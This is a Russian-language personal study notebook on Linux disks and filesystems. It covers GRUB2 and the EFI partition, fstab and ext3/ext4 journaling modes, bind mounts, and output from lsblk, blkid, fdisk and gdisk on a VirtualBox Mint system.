Last mounted on:          /
Filesystem UUID:          2bbebc3c-1983-4f38-9ff4-def1db791272
Filesystem magic number:  0xEF53
Filesystem revision #:    1 (dynamic)
Filesystem features:      ext_attr resize_inode dir_index filetype sparse_super large_file
Filesystem flags:         signed_directory_hash
Default mount options:    user_xattr acl
Filesystem state:         not clean
Errors behavior:          Continue
Filesystem OS type:       Linux
Inode count:              1283632
Block count:              5126912
Reserved block count:     256345
Overhead clusters:        91816
Free blocks:              2623274
Free inodes:              720122
First block:              0
Block size:               4096
Fragment size:            4096
Reserved GDT blocks:      1022
Blocks per group:         32768
...

Group 0: (Blocks 0-32767)
  Primary superblock at 0, Group descriptors at 1-2
  Reserved GDT blocks at 3-1024
  Block bitmap at 1025 (+1025)
  Inode bitmap at 1026 (+1026)
  Inode table at 1027-1537 (+1027)
  3872 free blocks, 5779 free inodes, 59 directories
.......

          ========  GRUB2 в разделе EFI, ESP (EFI/UEFI System Partition) sda3 ========= 
файл 33. Загрузчик GRUB — Основы GNU_Linux  - читай!  BIOS UEFI MBR ESP
Допустим, корень нас в LVM. Чтобы grub мог загрузить ядро и initramfs, ему нужен доступ в
  директорию /boot, но если они находятся на LVM разделе, grub не сможет их увидеть. 
 В таких случаях директорию /boot выносили на отдельный стандартный раздел. 
 Благодаря чему grub мог загрузить ядро и initramfs со стандартного раздела, 
 а дальше ядро находило в initramfs модули для LVM и могло примонтировать реальный корень.
grub2  поддерживает LVM!!, благодаря чему нет необходимости выносить /boot на отдельный раздел 
в отличии от grub! 

!!! 07-05-2023 Я: в /boot монтриуется при загрузке (согласно  /etc/fstab ) раздел EFI, а точнее ESP !! /dev/sda3  vfat
см 
1) cat /etc/fstab
# /boot/efi was on /dev/sda3 during installation
UUID=9DCA-6AA1  /boot/efi       vfat    umask=0077      0       1
end  !!! 07-05-2023 Я
2)findmnt
└─/boot/efi     /dev/sda3  vfat // sda3 - системынй раздел ESP, содержащий код EFI!!
3) sudo tree /boot/efi/EFI // т.е. в /boot/efi/EFI 2 каталога, код EFI (BOOT - загрузчик)
  ..  +  ubuntu - загрузчик для linux- Grub 
/boot/efi/EFI
├── BOOT
│   ├── BOOTX64.EFI
│   ├── fbx64.efi
│   └── mmx64.efi
└── ubuntu
    ├── BOOTX64.CSV
    ├── grub.cfg
    ├── grubx64.efi
    ├── mmx64.efi
    └── shimx64.efi

Можно также отдельно примонтировать EFI в каталог home
sudo mount /dev/sda3 ~/flusbmnt  // примонтировать раздел sda3 EFI посмотреть ЧТО В НЕМ ЗАГРУЗЧИК GRUB2 !!
sudo find ~/flusbmnt -ls
        1      1 drwx------   3 root     root          512 янв  1  1970 /home/oem/flusbmnt
        3      1 drwx------   4 root     root          512 мар 11 14:51 /home/oem/flusbmnt/EFI
        5      1 drwx------   2 root     root          512 мар 11 14:51 /home/oem/flusbmnt/EFI/ubuntu
       25   2534 -rwx------   1 root     root      2594696 мар 11 14:51 /home/oem/flusbmnt/EFI/ubuntu/grubx64.efi
       26    934 -rwx------   1 root     root       955656 мар 11 14:51 /home/oem/flusbmnt/EFI/ubuntu/shimx64.efi
       27    837 -rwx------   1 root     root       856232 мар 11 14:51 /home/oem/flusbmnt/EFI/ubuntu/mmx64.efi
       28      1 -rwx------   1 root     root          108 мар 11 14:51 /home/oem/flusbmnt/EFI/ubuntu/BOOTX64.CSV
       29      1 -rwx------   1 root     root          126 мар 11 14:51 /home/oem/flusbmnt/EFI/ubuntu/grub.cfg
        4      1 drwx------   2 root     root          512 мар 11 14:51 /home/oem/flusbmnt/EFI/BOOT
       17    934 -rwx------   1 root     root       955656 мар 11 14:51 /home/oem/flusbmnt/EFI/BOOT/BOOTX64.EFI
       18     84 -rwx------   1 root     root        85672 мар 11 14:51 /home/oem/flusbmnt/EFI/BOOT/fbx64.efi
       19    837 -rwx------   1 root     root       856232 мар 11 14:51 /home/oem/flusbmnt/EFI/BOOT/mmx64.efi

См файл grub2.doc, там скриншоты с меню UEFI менеджера GRUB2 на разделе EFI sda3 


ls -l /dev/disk/by-id/  // id устройств(их шин?) ata , usb
lrwxrwxrwx 1 root root  9 апр  5 22:44 ata-VBOX_CD-ROM_VB2-01700376 -> ../../sr0
lrwxrwxrwx 1 root root  9 апр  5 22:44 ata-VBOX_HARDDISK_VBe7ccbc66-cfd48015 -> ../../sda
lrwxrwxrwx 1 root root 10 апр  5 22:44 ata-VBOX_HARDDISK_VBe7ccbc66-cfd48015-part1 -> ../../sda1
lrwxrwxrwx 1 root root 10 апр  5 22:44 ata-VBOX_HARDDISK_VBe7ccbc66-cfd48015-part2 -> ../../sda2
lrwxrwxrwx 1 root root 10 апр  5 22:44 ata-VBOX_HARDDISK_VBe7ccbc66-cfd48015-part3 -> ../../sda3
lrwxrwxrwx 1 root root 10 апр  5 22:44 ata-VBOX_HARDDISK_VBe7ccbc66-cfd48015-part4 -> ../../sda4
lrwxrwxrwx 1 root root  9 апр  5 22:57 usb-_USB_DISK_2.0_077706000141-0:0 -> ../../sdb
lrwxrwxrwx 1 root root 10 апр  5 22:57 usb-_USB_DISK_2.0_077706000141-0:0-part1 -> ../../sdb1
lrwxrwxrwx 1 root root 10 апр  5 22:57 usb-_USB_DISK_2.0_077706000141-0:0-part2 -> ../../sdb2

ls -l /dev/disk/by-uuid // список дисков с их uuid
lrwxrwxrwx 1 root root 10 апр  5 22:44 1b33bbef-3cbf-41ea-9e3a-ed3b4ea26ba4 -> ../../sda1
lrwxrwxrwx 1 root root 10 апр  5 22:44 54d6b2b9-4dde-4a7c-9953-f6386668aaa7 -> ../../sda2
lrwxrwxrwx 1 root root 10 апр  5 22:44 9DCA-6AA1 -> ../../sda3
lrwxrwxrwx 1 root root 10 апр  5 22:57 BC41-718E -> ../../sdb1
lrwxrwxrwx 1 root root 10 апр  5 22:57 F3C0-4784 -> ../../sdb2

findfs // найти блоковое устройство по uuid и label или by-id
findfs UUID=54d6b2b9-4dde-4a7c-9953-f6386668aaa7
/dev/sda2

    = =   Журналирование в файовых системах  = =
https://itsecforu.ru/2020/07/24/%F0%9F%97%82%EF%B8%8F-%D1%87%D1%82%D0%BE-%D1%82%D0%B0%D0%BA%D0%BE%D0%B5-ext2-ext3-%D0%B8-ext4-%D0%B8-%D0%BA%D0%B0%D0%BA-%D1%81%D0%BE%D0%B7%D0%B4%D0%B0%D0%B2%D0%B0%D1%82%D1%8C-%D0%B8-%D0%BA%D0%BE/ Что такое Ext2, Ext3 и Ext4 и как создавать 
Ext2, Ext3 и Ext4 - наследницы, современные версии FS UNIX - BFS (беркли файл систем)
Ext3 и Ext4 имеют журналирование в отличи от Ext2
Настройка журнала файловой системы ext3/ext4  Linux Колис-ко. От новичка к профессионалу ( PDFDrive )2016.pdf
Журналируемая файловая система имеет три режима работы: journal, ordered и writeback. 
Первый режим самый медленный, но он позволяет минимизировать потери ваших данных в случае сбоя 
системы или отключения питания. В режиме journal в системный журнал записывается все, что только
 можно, и это позволяет максимально восстановить файловую систему в случае сбоя.
 В последовательном режиме (ordered) в журнал заносится информация только об изменении метаданных
(служебных данных файловой системы). Этот режим используется по умолчанию и является компромиссным
 вариантом между производительностью и отказоустойчивостью. Самым быстрым является режим 
обратной записи (writeback). Но использовать егоя вам не рекомендую, поскольку особого толку от
 него не будет(Проще тогда уже при установке Linux выбрать файловую систему ext2 вместо ext3/ext4.
 Если отказоустойчивость для вас на первом месте — выбирайте режим journal, во всех остальных 
случаях лучше выбрать ordered. Выбор режима осуществляется редактированием файла /etc/fstab.
# режим ordered используется по умолчанию,поэтому ничего указывать не нужно
/dev/sdal / ext3 defaults 1 0
# на этом разделе важные данные, используем режим journal
/dev/sda2 /var ext3 data=journal 1 0 
   // 08 04 2023 Я:если самому добавить в mint /etc/fstab для / "data=journal 1 0 " ОС перестанет загружаться!!
   !Исправил проблемму путем выбора в меню загрузки grub опции "e" редактирования grub.cfg, ключ "ro" исправить на "rw"
     menuentry 'Linux Mint 21.1 Xfce' ...
        linux   /boot/vmlinuz-5.15.0-56-generic root=UUID=1b33bbef-3cbf-41ea-9e3a-ed3b4ea26ba4 rw text <--!
# здесь ничего важного нет, режим writeback
/dev/sda2 /opt ext3 data=writeback 0 0
После изменения этого файла выполните команду:
# mount -а //Она заново смонтирует все файловые системы, чтобы изменения вступили в силу

файл 23. Основы файловых систем — Основы GNU Принцип Журналирования
операции при работе с файлами – их создание или удаление – требуют от файловой системы
нескольких операций – создание жёсткой ссылки, изменение информации в inode, записывание данных на 
диск и т.п. Но что, если при создании или удалении файла выполнится только часть этих операций, 
а потом компьютер резко выключится или вы вытащите флешку? В итоге у вас может появится жёсткая 
ссылка, указывающая на иноду, в которой нет никаких данных. Или скажем запишется только часть 
данных, а инода будет указывать на незанятые блоки, в итоге место будет недоступно. Когда у вас
пишутся сотни и тысячи файлов – это создаст кучу ошибок в файловой системе.
Исключить резкое выключение компьютера невозможно. 

Если писать все операции с файлами предварительно в специальное место, называемое журналом, а уже
потом применять на диск – то файловая система после сбоя всегда может посмотреть в журнале, а 
что там недописалось и подчистить всякие ошибки при включении. Да и журналировать можно не 
только операции и метаданные, но и сами файлы, но это зависит от типа и настроек файловой системы.
 В любом случае, наличие журнала позволяет смягчить урон при резкой потере связи с диском. 
Журналирование есть в большинстве современных файловых систем.

 ######## Привязки Зеркало Папки ######### https://itshaman.ru/articles/3/mount
1)Есть в Linux уникальная возможность указать ЗЕРКАЛО папки, которое получает все права и доступные над папкой действия. Допустим, раздел /dev/sdb1 применяется еще и для хранения документов. Зеркалим его в /home/user/Документы:
sudo mount --bind /home/user/Видео /home/user/Документы.  Действие команды mount --bind напоминает DOS-овский subst.
2)https://zalinux.ru/?p=4904 Альтернативный (классический) способ создания монтирования привязки только для чтения — использовать операцию повторного монтирования, например:
mount --bind СТАРАЯ_ДИРЕКТОРИЯ НОВАЯ_ДИРЕКТОРИЯ
mount -o remount,bind,ro СТАРАЯ_ДИРЕКТОРИЯ НОВАЯ_ДИРЕКТОРИЯ
Я: 27 04 2023 ---------- Также возможно несколькими командами примонтировать диск в несколько папок
(см выше про lsblk "ОДНОВРЕМЕННО в 2 каталога  /mnt/md22, /home/oem/flusbmnt!!")

!! Кетов: Чтобы перемонтировать файловую систему с включением ACL на ней без перезагрузки ОС,
mount -o remount, acl /
!! 

Чтобы вручную задать параметры доступа к примонтированному разделу следует указать параметр:
-o rw Первый разрешает чтение и запись, -o ro  второй только чтение.  например, так:
sudo mount -t ext3 -o rw /dev/sdb1 /home/user/Видео
Дополнительные параметры, которые помогают в некоторых случаях:
sudo mount -t ext3 -o rw,iocharset=utf8,codepage=866 /dev/sdb1 /home/user/Видео
Первый явно задает кодировку системной локали, в нашем случае это utf8 (для разных дистрибутивов она своя, но чаще utf8), а другая добавляет поддержку русского языка.

                      #### Принудительное монтирование раздела/диска #######
Если все же жесткий диск отказывается монтироваться в операционной системе Linux, то можно примонтировать его вручную. Параметр -o force позволяет принудительно монтировать разделы жесткого диска в линуксе. Ну, к примеру, так:
sudo mount -t ext3 -o force /dev/sdb1 /home/user/Видео


############ Решение проблемы с доступом на чтение разделов с ext2 3 4 #####################
!!Я: на личном примере создал различные разделы ext2, ext3 и ext4  на usb-flash (разделы форматированы с правами root), но при этом при монтировании раздела ext2 в папку ~(/home/mint) или /mnt или иную другую, писать на диск можно под sudo (также с правами root). 
ls -ild /media/oem/Dsk2
  2 drwxr-xr-x 3 root root 1024 апр 14 17:26 /media/oem/Dsk2
Чтобы сделать записываемой для всех пользователе разделы, следует изменить  права на файл раздела
sudo chmod 0777 или chmod o+w /media/oem/sdb1    (https://zalinux.ru/?p=4904)
ls -ild /media/oem/Dsk2
  2 drwxrwxrwx 3 root root 1024 апр 14 17:50 /media/oem/Dsk2.Результат сохраняется в файловой системе до последующего изменения прав chmod!
В то же время vfat разделы создаются с правами oem uid=29999,gid=29999 - не root! Нет необходимости применять chmod 0777 или chmod o+w
/dev/sdb2 on /media/oem/uflsh2 type vfat rw,nosuid,nodev,relatime,uid=29999,gid=29999,fmask=0022,dmask=0022,..) - из mount >

Linux позволят работать с диками как 1)через файловую систему /sys/, так и 2)через устройства /dev/
В этих каnалогов БЕЗ монтирования видны разделы дисков 
Узнать о наличии разделов на диске/флешеке БЕЗ МОНТИРОВАНИЯ ее к каталогу media ! - см /dev/sdх и /sys/block/...  
ls -il /dev/sdc1,
1521 brw-rw---- 1 root disk 8, 33 Jan 25 19:38 /dev/sdc1
а также  lsscsi -c

 //Системный раздел  EFI (UEFI, ESP) альтернатива BIOS boot, использует как таблицу GPT (часть стандарта UEFI)так и MBR
В Mint раздел EFI при загрузке монтируется в каталог /boot/efi, в нем загрузчик GRUB2 в папке ububtu (см ниже) // Linux. Установка, настройка, администрирование.pdf c428, 449

cat /etc/fstab
# <file system> <mount point>   <type>  <options>       <dump>  <pass>
# / was on /dev/sda1 during installation
UUID=1b33bbef-3cbf-41ea-9e3a-ed3b4ea26ba4 /               ext4    errors=remount-ro 0       1
# /boot/efi was on /dev/sda3 during installation
UUID=9DCA-6AA1  /boot/efi       vfat    umask=0077      0       1

sudo ls /boot/efi/EFI/BOOT  
BOOTX64.EFI  fbx64.efi  mmx64.efi
oem@LnxPC:~$ sudo ls -il /boot/efi/EFI/BOOT
итого 1854
1426 -rwx------ 1 root root 955656 мар 11 14:51 BOOTX64.EFI
1427 -rwx------ 1 root root  85672 мар 11 14:51 fbx64.efi
1428 -rwx------ 1 root root 856232 мар 11 14:51 mmx64.efi
sudo ls -ilh /boot/efi/EFI/BOOT
итого 1,9M
1426 -rwx------ 1 root root 934K мар 11 14:51 BOOTX64.EFI
1427 -rwx------ 1 root root  84K мар 11 14:51 fbx64.efi
1428 -rwx------ 1 root root 837K мар 11 14:51 mmx64.efi
sudo ls -ilh /boot/efi/EFI/ubuntu
итого 4,3M
1438 -rwx------ 1 root root  108 мар 11 14:51 BOOTX64.CSV
1439 -rwx------ 1 root root  126 мар 11 14:51 grub.cfg
1435 -rwx------ 1 root root 2,5M мар 11 14:51 grubx64.efi
1437 -rwx------ 1 root root 837K мар 11 14:51 mmx64.efi
1436 -rwx------ 1 root root 934K мар 11 14:51 shimx64.efi

 = = = = = =  ПРОСМОТР ДИСКОВ Работает без монтированной флешки UUID  = = = = !!!
ВАРИАНТЫ
1.0 !BEST!)ll -R /dev/disk/ - полный список всехустройств по UUID, по label, по id и т.д.
1.1) less  /etc/mtab // просмотр файла-журнала смонтированных устройств и файловых систем (НЕ!  отображает метадиски!), обновляется интерактивно, думаю(Я) udev (см ниже "udevadm monitor")
sysfs /sys sysfs rw,nosuid,nodev,noexec,relatime 0 0
proc /proc proc rw,nosuid,nodev,noexec,relatime 0 0
udev /dev devtmpfs rw,nosuid,relatime,size=948748k,nr_inodes=237187,mode=755,inode64 0 0
/dev/sda1 / ext2 rw,relatime,errors=remount-ro 0 0
/dev/sda4 /boot/efi fat  rw,relatime,fmask=0077,dmask=0077errors=remount-ro 0 0
/dev/sda2 /dos vfat rw,relatime,gid=46,fmask=0007,dmask=0007,allow_utime=0020shortname=mixed
/dev/sdb4 /media/oem/Dsk3 ext4 rw,nosuid,nodev,relatime,errors=remount-ro 0 0
/dev/sdb3 /media/oem/Dsk2 ext4 rw,nosuid,nodev,relatime,errors=remount-ro 0 0
/dev/sdb1 /media/oem/Dsk1 ext4 rw,nosuid,nodev,relatime,errors=remount-ro 0 0
/dev/md22 /mnt/md22 ext4 rw,relatime,errors=remount-ro 0 0
1.1.1) cat /run/mount/utab // просмотр файла-журнала смонтированных устройствUSB (НЕ! отображает метадиски!)
SRC=/dev/sdb3 TARGET=/media/oem/25763E5C58F9951B ROOT=/ OPTS=uhelper=udisks2
SRC=/dev/sdb4 TARGET=/media/oem/7AE3-1839 ROOT=/ OPTS=uhelper=udisks2
1.2) less /proc/self/mountinfo // !! список смонтированых systemd устройств в хронологическом порядке
461 440 0:41 / /run/user/29999/gvfs rw,nosuid,nodev,relatime shared:262 - fuse.gvfsd-fuse gvfsd-fuse rw,user_id=29999,group_id=29999
678 29 8:20 / /media/oem/Dsk3 rw,nosuid,nodev,relatime shared:373 - ext4 /dev/sdb4 rw,errors=remount-ro
546 29 8:19 / /media/oem/Dsk2 rw,nosuid,nodev,relatime shared:322 - ext4 /dev/sdb3 rw,errors=remount-ro
655 29 8:17 / /media/oem/Dsk1 rw,nosuid,nodev,relatime shared:349 - ext4 /dev/sdb1 rw,errors=remount-ro
653 29 9:22 / /media/oem/83baa45..be2 rw,nosuid,nodev,relatime shared:360 - ext4 /dev/md22 rw,errors=re:
1.3!) ls /dev/sd* 
2.1!)  blkid   // узнать UUID
/dev/sdb2: LABEL_FATBOOT="uflsh2" LABEL="uflsh2" UUID="F3C0-4784" BLOCK_SIZE="512" TYPE="vfat" PARTUUID="89635ded-02"
/dev/sdb1: LABEL_FATBOOT="prt1" LABEL="prt1" UUID="BC41-718E" BLOCK_SIZE="512" TYPE="vfat" PARTUUID="89635ded-01"
/dev/sda2: UUID="54d6b2b9-4dde-4a7c-9953-f6386668aaa7" TYPE="swap" PARTUUID="4dcae767-32a9-4daf-b233-89627e574731"
/dev/sda3: UUID="9DCA-6AA1" BLOCK_SIZE="512" TYPE="vfat" PARTUUID="0d0d5900-eb88-4a55-9b2b-0753b0a98ad9"
/dev/sda1: UUID="1b33bbef-3cbf-41ea-9e3a-ed3b4ea26ba4" BLOCK_SIZE="4096" TYPE="ext4" PARTUUID="6b85becb-5c69-4d32-acdb-27d23b65b872"

2.2) lsblk
NAME     MAJ:MIN RM   SIZE RO TYPE  MOUNTPOINTS
sda        8:0    0  21,4G  0 disk
├─sda1     8:1    0  19,6G  0 part  /
├─sda2     8:2    0   1,7G  0 part  /dos
├─sda3     8:3    0     3M  0 part
└─sda4     8:4    0    48M  0 part  /boot/efi
sdb        8:16   1   3,7G  0 disk
├─sdb1     8:17   1     1G  0 part
│ └─md22   9:22   0  1022M  0 raid1 /media/oem/83baa45b-e4fe-4f42-b26d-4057bae87be2
├─sdb2     8:18   1     1G  0 part
│ └─md22   9:22   0  1022M  0 raid1 /media/oem/83baa45b-e4fe-4f42-b26d-4057bae87be2
├─sdb3     8:19   1     1G  0 part
└─sdb4     8:20   1   757M  0 part  /media/oem/7AE3-1839
sdc        8:32   1   1,9G  0 disk
├─sdc1     8:33   1   322M  0 part
│ └─md11   9:11   0   960M  0 raid0 /media/oem/c13a77a2-16b6-4277-ae89-8564984b56bd
├─sdc2     8:34   1 997,8M  0 part  /media/oem/uflsh2
├─sdc3     8:35   1   322M  0 part
│ └─md11   9:11   0   960M  0 raid0 /media/oem/c13a77a2-16b6-4277-ae89-8564984b56bd
└─sdc4     8:36   1   322M  0 part
  └─md11   9:11   0   960M  0 raid0 /media/oem/c13a77a2-16b6-4277-ae89-8564984b56bd

lsblk -f  // узнать UUID, задействование диска тип файловой системы (ext vfat...)
 //метадиск RAID0md127 смонтирован (или юнитом/модулем systemd или mdadm -A) в /mnt/md22 - он ОТОБРАЖАЕТСЯ (см ниже листинг с размером шрифта не более 18пт)!!
 // !!! ВНИМАНИЕ: У разделов sdb отдельный! UUID и sdb, привязанных к md, СВОЙ  UUID!
NAME      FSTYPE          FSVER LABEL     UUID                          FSAVAIL FSUSE% MOUNTPOINTS
sda
├─sda1    ext4            1.0             1b33bbef-3cbf-...-ed3b4ea26ba4    9,9G    45% /
├─sda2    ext4            1.0   sda-2     6c0e7c53-f07c-...-080aa36aee95    1,6G     0% /mnt/sda-2
├─sda3    vfat            FAT32           9DCA-6AA1                        41,2M    13% /boot/efi
└─sda4
sdb
├─sdb1    linux_raid_memb 1.2   lnxmnt:11 41145349-3996-...-fc80e7333159
│ └─md127 ext2            1.0   mdRaid0   020ebf59-17ff-...-fbbf6d437e61  575,2M    34% /mnt/md22
├─sdb2    vfat            FAT32 uflsh2    F3C0-4784
├─sdb3    linux_raid_memb 1.2   lnxmnt:11 41145349-3996-...-fc80e7333159
│ └─md127 ext2            1.0   mdRaid0   020ebf59-17ff-...-fbbf6d437e61  575,2M    34% /mnt/md22
└─sdb4    linux_raid_memb 1.2   lnxmnt:11 41145349-3996-...-fc80e7333159
  └─md127 ext2            1.0   mdRaid0   020ebf59-17ff-...-fbbf6d437e61  575,2M    34% /mnt/md22

 lsblk -f   //ЗДЕСЬ метадиск RAID1md22 (sdb1+sdb2) НЕ смонтирован (не собран повторно),точка монтирования для него НЕ ОТОБРАЖАЕТСЯ!!, но его индексы "22" привязаны к меткам составных дисков
NAME FSTYPE FSVER LABEL UUID                  FSAVAIL FSUSE% MOUNTPOINTS
sda
├─sda1 
│    ext4   1.0         1b33bbef-3c-....6ba4   10,2G    44% /
├─sda2
│    ext4   1.0   sda-2 6c0e7c53-f07...ee95    1,6G     0% /mnt/sda-2
├─sda3
│    vfat   FAT32       9DCA-6AA1              41,2M    13% /boot/efi
└─sda4
sdb
├─sdb1
│    linux_ 1.2   LnxPC:22
│                       2fb48274-6f....4446
├─sdb2
│    linux_ 1.2   LnxPC:22
│                       2fb48274-6f....4446
├─sdb3     ntfs         25763E5C58F9951B      1002,4M   2% /media/oem/25763E5C58F9951B
└─sdb4     vfat   FAT   7AE3-1839              750,7M   1% /media/oem/7AE3-1839

 lsblk -f //ПРЕД случай, но после повторной сборки md22 и примонтирования md22 (ОДНОВРЕМЕННО в 2 каталога  /mnt/md22, /home/oem/flusbmnt!!) md22 появился с ДВУМЯ UUID (1йUUID- метадиска, 2йUUID- fs ext4 на RAID1!!!)
sdb
├─sdb1
│    linux_ 1.2   LnxPC:22
│                       2fb48274-6f76-437b-3660-47d4f53d4446
│ └─md22
│    ext4   1.0         83baa45b-e4fe-4f42-b26d-4057bae87be2  920,3M     0% /mnt/md22
│                                                                           /home/oem/flusbmnt
├─sdb2
│    linux_ 1.2   LnxPC:22
│                       2fb48274-6f76-437b-3660-47d4f53d4446
│ └─md22
│    ext4   1.0         83baa45b-e4fe-4f42-b26d-4057bae87be2  920,3M     0% /mnt/md22
│                                                                           /home/oem/flusbmnt
├─sdb3
│    ntfs               25763E5C58F9951B                     1002,4M     2% /media/oem/25763E5C58F9951B
└─sdb4
     vfat   FAT32       7AE3-1839                             750,7M     1% /media/oem/7AE3-1839

!!! //Ниже случай после "автоматической" сборки  (в GUI при обращении мышью на иконку в проводнике) md
 средствами udevd (см ниже "udevadm monitor"). При  этом,  md22 (c UUID  2fb48274-6f76-437b-3660-47d4f53d4446),
 был прописан в /etc/mdadm/mdadm.conf, а md11 - НЕТ!, но благополучно "собрался" по метаданным составных дисков md.
(см листинг с применением малого размера шрифта!).
lsblk -f
NAME     FSTYPE            FSVER LABEL     UUID                                 FSAVAIL FSUSE% MOUNTPOINTS
sda
├─sda1   ext2              1.0             2bbebc3c-1983-4f38-9ff4-def1db791272      9G    48% /
├─sda2   vfat              FAT32           DFDC-0B9C                               1,6G     1% /dos
├─sda3
└─sda4   vfat              FAT32           E093-43FE                              41,2M    13% /boot/efi
sdb
├─sdb1   linux_raid_member 1.2   LnxPC:22  2fb48274-6f76-437b-3660-47d4f53d4446
│ └─md22 ext4              1.0             83baa45b-e4fe-4f42-b26d-4057bae87be2  920,3M     0% /media/oem/83baa45b-e4fe-4f42-b26d-4057bae87be2
├─sdb2   linux_raid_member 1.2   LnxPC:22  2fb48274-6f76-437b-3660-47d4f53d4446
│ └─md22 ext4              1.0             83baa45b-e4fe-4f42-b26d-4057bae87be2  920,3M     0% /media/oem/83baa45b-e4fe-4f42-b26d-4057bae87be2
├─sdb3
└─sdb4   vfat              FAT32           7AE3-1839                             261,8M    65% /media/oem/7AE3-1839
sdc
├─sdc1   linux_raid_member 1.2   lnxmnt:11 41145349-3996-058d-1c7c-fc80e7333159
│ └─md11 ext2              1.0             c13a77a2-16b6-4277-ae89-8564984b56bd  895,5M     0% /media/oem/c13a77a2-16b6-4277-ae89-8564984b56bd
├─sdc2   vfat              FAT32 uflsh2    F3C0-4784                              11,7M    99% /media/oem/uflsh2
├─sdc3   linux_raid_member 1.2   lnxmnt:11 41145349-3996-058d-1c7c-fc80e7333159
│ └─md11 ext2              1.0             c13a77a2-16b6-4277-ae89-8564984b56bd  895,5M     0% /media/oem/c13a77a2-16b6-4277-ae89-8564984b56bd
└─sdc4   linux_raid_member 1.2   lnxmnt:11 41145349-3996-058d-1c7c-fc80e7333159
  └─md11 ext2              1.0             c13a77a2-16b6-4277-ae89-8564984b56bd  895,5M     0% /media/oem/c13a77a2-16b6-4277-ae89-8564984b56bd
sr0
df -T
Файл.система   Тип   1K-блоков Использовано Доступно Использовано% Cмонтировано в
tmpfs          tmpfs    202324         1496   200828            1% /run
/dev/sda1      ext2   20140384      9674580  9440424           51% /
tmpfs          tmpfs   1011608            0  1011608            0% /dev/shm
tmpfs          tmpfs      5120            4     5116            1% /run/lock
/dev/sda2      vfat    1754756        24960  1729796            2% /dos
/dev/sda4      vfat      48368         6182    42187           13% /boot/efi
tmpfs          tmpfs    202320          116   202204            1% /run/user/29999
/dev/sdc2      vfat    1019752      1007768    11984           99% /media/oem/uflsh2
/dev/sdb4      vfat     773624       505552   268072           66% /media/oem/7AE3-1839
/dev/md22      ext4    1011148           72   942368            1% /media/oem/83baa45b-e4fe-4f42-b26d-4057bae87be2
/dev/md11      ext2     966396          244   917000            1% /media/oem/c13a77a2-16b6-4277-ae89-8564984b56bd


2.3)  lsblk -o NAME,PATH,LABEL,UUID,FSSIZE,FSAVAIL
NAME   PATH      LABEL  UUID                                 FSSIZE FSAVAIL
sda    /dev/sda
├─sda1 /dev/sda1        2bbebc3c-1983-4f38-9ff4-def1db791272  19,2G      9G
├─sda2 /dev/sda2        DFDC-0B9C                              1,7G    1,6G
├─sda3 /dev/sda3
└─sda4 /dev/sda4        E093-43FE                             47,2M   41,2M
sdb    /dev/sdb
├─sdb1 /dev/sdb1 Dsk1   f8251a1e-1ba3-4290-ac84-d2528beb2588 291,8M  271,6M
├─sdb2 /dev/sdb2 uflsh2 F3C0-4784                            995,9M   19,6M
├─sdb3 /dev/sdb3 Dsk2   c5c46ff1-334b-45e8-9793-3ad8f28477bf 291,8M  271,7M
└─sdb4 /dev/sdb4 Dsk3   eaf8b110-c20e-4a62-b1ec-c9e74cae958d 299,8M  283,7M

3!) sudo fdisk -l 
Диск /dev/sda: 22,35 GiB, 23993204736 байт, 46861728 секторов
Disk model: VBOX HARDDISK
Единицы: секторов по 1 * 512 = 512 байт
Размер сектора (логический/физический): 512 байт / 512 байт
Размер I/O (минимальный/оптимальный): 512 байт / 512 байт
Тип метки диска: gpt
Идентификатор диска: C79C3C21-D440-4898-BA96-067CB3733466
Устр-во     начало    Конец  Секторы Размер Тип
/dev/sda1  3893248 46860287 42967040  20,5G Файловая система Linux
/dev/sda2   104448  3893247  3788800   1,8G Linux своп
/dev/sda3     6144   104447    98304    48M EFI
/dev/sda4     2048     6143     4096     2M BIOS boot

Диск /dev/sdb: 1,92 GiB, 2063597568 байт, 4030464 секторов
Disk model: USB DISK 2.0
Единицы: секторов по 1 * 512 = 512 байт
Размер сектора (логический/физический): 512 байт / 512 байт
Размер I/O (минимальный/оптимальный): 512 байт / 512 байт
Тип метки диска: dos
Идентификатор диска: 0x89635ded
Устр-во    Загрузочный  начало   Конец Секторы Размер Идентификатор Тип
/dev/sdb1  *              2048 1983999 1981952 967,8M             c W95 FAT32 (LBA)
/dev/sdb2              1984000 4027519 2043520 997,8M             c W95 FAT32 (LBA)

4) cat /proc/partitions
major minor  #blocks  name
  11        0    1048575 sr0  //cdrom
   8        0   23430864 sda
   8        1   21483520 sda1
   8        2    1894400 sda2
   8        3      49152 sda3
   8        4       2048 sda4
   8       16    3921920 sdb
   8       17    1048576 sdb1
   8       18    1048576 sdb2
   8       19    1048576 sdb3
   8       20     775168 sdb4
   9       22    1046528 md22 // raid

5!) sudo parted -l
Модель: ATA VBOX HARDDISK (scsi)
Диск /dev/sda: 24,0GB
Размер сектора (логич./физич.): 512B/512B
Таблица разделов: gpt
Флаги диска:
Номер  Начало  Конец   Размер  Файловая система  Имя  Флаги
 4     1049kB  3146kB  2097kB                         bios_grub
 3     3146kB  53,5MB  50,3MB  fat32                  загрузочный, esp
 2     53,5MB  1993MB  1940MB  linux-swap(v1)         подкачка
 1     1993MB  24,0GB  22,0GB  ext4
Модель:  USB DISK 2.0 (scsi)
Диск /dev/sdb: 2064MB
Размер сектора (логич./физич.): 512B/512B
Таблица разделов: msdos
Флаги диска:

Номер  Начало  Конец   Размер  Тип      Файловая система  Флаги
 1     1049kB  1016MB  1015MB  primary  fat32             загрузочный, lba
 2     1016MB  2062MB  1046MB  primary  fat32             lba

sudo gdisk /dev/sda // просмотреть инф. о разделе диска с GPT 
GPT fdisk (gdisk) version 1.0.8

Partition table scan:
  MBR: protective  // - для обратной совместимости
  BSD: not present
  APM: not present
  GPT: present

Found valid GPT with protective MBR; using GPT.


6!)sudo gdisk -l /dev/sda //  просмотреть инф. о разделе диска с GPT
GPT fdisk (gdisk) version 1.0.8
Partition table scan:
  MBR: protective   // - для обратной совместимости
  BSD: not present
  APM: not present
  GPT: present      // раздел c GPT !!
Found valid GPT with protective MBR; using GPT.
Disk /dev/sda: 46861728 sectors, 22.3 GiB
Model: VBOX HARDDISK
Sector size (logical/physical): 512/512 bytes
Disk identifier (GUID): C79C3C21-D440-4898-BA96-067CB3733466
Partition table holds up to 128 entries
Main partition table begins at sector 2 and ends at sector 33
First usable sector is 34, last usable sector is 46861694
Partitions will be aligned on 2048-sector boundaries
Total free space is 3421 sectors (1.7 MiB)
Number  Start (sector)    End (sector)  Size       Code  Name
   1         3893248        46860287   20.5 GiB    8300
   2          104448         3893247   1.8 GiB     8200
   3            6144          104447   48.0 MiB    EF00
   4            2048            6143   2.0 MiB     EF02

sudo gdisk -l /dev/sdb
